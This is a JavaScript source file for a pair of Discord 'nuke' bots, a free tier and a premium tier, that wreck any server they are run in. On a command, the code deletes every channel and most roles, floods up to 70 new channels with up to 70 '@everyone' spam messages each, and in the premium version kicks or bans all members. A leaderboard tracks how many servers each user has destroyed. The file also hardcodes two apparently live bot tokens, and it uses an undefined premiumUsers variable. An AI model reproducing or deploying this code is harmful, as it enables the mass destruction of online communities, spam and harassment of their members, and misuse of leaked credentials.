const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const fs = require('fs');

// Bot 1 Configuration (Free Nuke)
const bot1Config = {
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildVoiceStates,
    ],
    ownerId: '693769349235998801', // Replace with your bot 1 owner ID
};

// Bot 2 Configuration (Premium Nuke)
const bot2Config = {
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildVoiceStates,
    ],
    ownerId: '693769349235998801', // Replace with your bot 2 owner ID
};

// Bot 1 Client
const bot1 = new Client(bot1Config);
// Bot 2 Client
const bot2 = new Client(bot2Config);

// Premium Guild
const requiredGuild = '1221059714020806716'; // Replace with your premium guild ID
// Premium Role
const premiumRole = '1229781294649577473'; // Replace with your premium role ID

// Load data for both bots
let leaderboards = {};

try {
    leaderboards = JSON.parse(fs.readFileSync('./leaderBoard.json'));
} catch (error) {
    console.error('Error loading leaderboards:', error);
}


// Nuke Channel Names
const nukeChannelNames = [
    'vindustry',
    'Get Nuked',
    'Nuke by discord.gg/vindustry',
]

const updateLeaderboard = (userId, guildId) => {
    // Find the user in the leaderboard
    if (!leaderboards.hasOwnProperty(userId)) {
        // If the server's leaderboard doesn't exist yet, create it
        leaderboards[userId] = { mostNukes: 0, biggestNuke: 0, biggestNukeName: '' };
    }

    // Increment the mostNukes count by 1
    leaderboards[userId].mostNukes++;

    // Update the biggestNuke if the member count of the server nuked is greater than the current biggestNuke
    const guild = bot1.guilds.cache.get(guildId) || bot2.guilds.cache.get(guildId);
    if (guild && guild.memberCount > leaderboards[userId].biggestNuke) {
        leaderboards[userId].biggestNuke = guild.memberCount;
        leaderboards[userId].biggestNukeName = guild.name;
    }

    // Save updated leaderboard to JSON file
    fs.writeFileSync('./leaderBoard.json', JSON.stringify(leaderboards));
};



// Free setup logic
const freeSetup = async (message) => {
    const guild = message.guild;
    const channels = guild.channels.cache;
    const roles = guild.roles.cache;
    // if (!bot1.guilds.cache.has(requiredGuild)) return;

    await Promise.all(channels.map(channel => channel.delete()));
    const botHighestRolePosition = message.guild.members.me.roles.highest ? message.guild.members.me.roles.highest.rawPosition : 0;

    await Promise.all(
        roles
            .filter(role => !role.managed && role.name !== '@everyone' && role.rawPosition < botHighestRolePosition)
            .map(role => role.delete())
    );

    const createChannelPromises = [];
    for (let i = 0; i < 1; i++) {
        createChannelPromises.push(guild.channels.create({ name: nukeChannelNames[Math.floor(Math.random() * nukeChannelNames.length)], type: ChannelType.GuildText }));
    }
    const createdChannels = await Promise.all(createChannelPromises);

    const sendMessagePromises = [];
    for (const channel of createdChannels) {
        for (let i = 0; i < 1; i++) {
            sendMessagePromises.push(channel.send('@everyone @everyone discord.gg/vindustry'));
        }
    }
    await Promise.all(sendMessagePromises);
    // Reply to the user

    // Update leaderboard
    updateLeaderboard(message.author.id, guild.id);
};



// Premium setup logic
const premiumSetup = async (message) => {
    const botInGuilds2 = bot2.guilds.cache;
    if (!botInGuilds2.has(requiredGuild)) {
        console.log('Premium guild not found');
        return;
    }
    const guildPremium = botInGuilds2.get(requiredGuild);
    const rolePremium = guildPremium.roles.cache.get(premiumRole);
    if (!rolePremium) {
        console.log('Premium role not found');
        return;

    }
    if (!message.member.roles.cache.has(rolePremium.id)) {
        console.log('User does not have premium role');
        return;

    }   



    const guild = message.guild;
    const channels = guild.channels.cache;
    const members = guild.members.cache.filter(member => !member.user.bot);
    const roles = guild.roles.cache;
    const [_, channelName, msgContent, doKick, doBan] = message.content.split(' ');


    await Promise.all(channels.map(channel => channel.delete()));
    console.log(message.guild.members.me.roles.highest)
    const botHighestRolePosition = message.guild.members.me.roles.highest ? message.guild.members.me.roles.highest.rawPosition : 0;

    await Promise.all(
        roles
            .filter(role => !role.managed && role.name !== '@everyone' && role.rawPosition < botHighestRolePosition)
            .map(role => role.delete())
    );

    const createChannelPromises = [];
    for (let i = 0; i < 70; i++) {
        createChannelPromises.push(guild.channels.create({ name: channelName || nukeChannelNames[Math.floor(Math.random() * nukeChannelNames.length)], type: ChannelType.GuildText }));
    }
    const createdChannels = await Promise.all(createChannelPromises);

    const sendMessagePromises = [];
    for (const channel of createdChannels) {
        for (let i = 0; i < 70; i++) {
            sendMessagePromises.push(channel.send(msgContent || '@everyone @everyone discord.gg/vindustry'));
        }
    }
    await Promise.all(sendMessagePromises);

    if (doKick) await Promise.all(members.map(member => member.kick()));
    if (doBan) await Promise.all(members.map(member => member.ban()));
    
    updateLeaderboard(message.author.id, guild.id);

};

// Common leaderboard logic
const displayLeaderboard = async (message, type) => {
    const leaderboardEmbed = {
        color: 0x0099ff,
        title: 'Leaderboard',
        fields: [],
    };

    const leaderboard = Object.entries(leaderboards)
        .sort((a, b) => b[1].mostNukes - a[1].mostNukes)
        .slice(0, 10);

    for (const [userId, data] of leaderboard) {
        const member = await message.guild.members.fetch(userId);
        if (!member) continue;
        const { username, discriminator } = member.user;
        const { mostNukes, biggestNuke, biggestNukeName } = data;

        let value = `Most Nukes: ${mostNukes}`;
        if (type === 'biggestNuke') {
            value = `Biggest Nuke: ${biggestNuke} in ${biggestNukeName}`;
        }

        leaderboardEmbed.fields.push({
            name: `${username}#${discriminator}`,
            value,
        });
    }

    await message.reply({ embeds: [leaderboardEmbed] });
};

// Bot 1 Message Create Event
bot1.on('messageCreate', async (message) => {
    if (message.content === '!setup') {
        // if (!bot1Config.ownerId.includes(message.author.id)) return;

        await freeSetup(message);
    }

    if (message.content.startsWith('!leaderboard')) {
        const [_, type] = message.content.split(' ');

        await displayLeaderboard(message, type || 'mostNukes');
    }
});

// Bot 2 Message Create Event
bot2.on('messageCreate', async (message) => {
    if (message.content.startsWith('!setupP')) {
        await premiumSetup(message);
        console.log('Premium setup done');
    }

    if (message.content.startsWith('!leaderboard')) {
        const [_, type] = message.content.split(' ');
        console.log('Leaderboard requested', type);

        await displayLeaderboard(message, type || 'biggestNuke');
    }

    if (message.content.startsWith('!addPremium') || message.content.startsWith('!?removePremium')) {
        if (!bot2Config.ownerId.includes(message.author.id)) return;

        const [command, mention] = message.content.split(' ');
        const targetUser = message.mentions.users.first();
        if (!targetUser) return;

        if (command === '!addPremium' && !premiumUsers.includes(targetUser.id)) {
            premiumUsers.push(targetUser.id);
            fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
            message.reply(`Added premium to ${targetUser.username}`);
            setTimeout(() => message.delete(), 3000);
        } else if (command === '!?removePremium' && premiumUsers.includes(targetUser.id)) {
            premiumUsers = premiumUsers.filter(userId => userId !== targetUser.id);
            fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
        }
    }
});

bot1.once('ready', () => {
    console.log('Bot 1 logged in with username:', bot1.user.username);
});
bot2.once('ready', () => {
    console.log('Bot 2 logged in with username:', bot2.user.username);
});


// Bot 1 Login
bot1.login('MTIyOTExNjYzMjcwNjU4MDU4Mw.GFzHLw.bNn9VK74LV6mLOaClyZXo1wmR0lnb1HPLXEfRs'); // Replace 'BOT1_TOKEN' with your bot 1 token

// Bot 2 Login
bot2.login('MTIyODc2NTM2OTcxMjUxMzAzNg.G9YGQD.oVlAvGZCAVxwE_8GWpIfGcLNasy7bDAhCNx18Q'); // Replace 'BOT2_TOKEN' with your bot 2 token

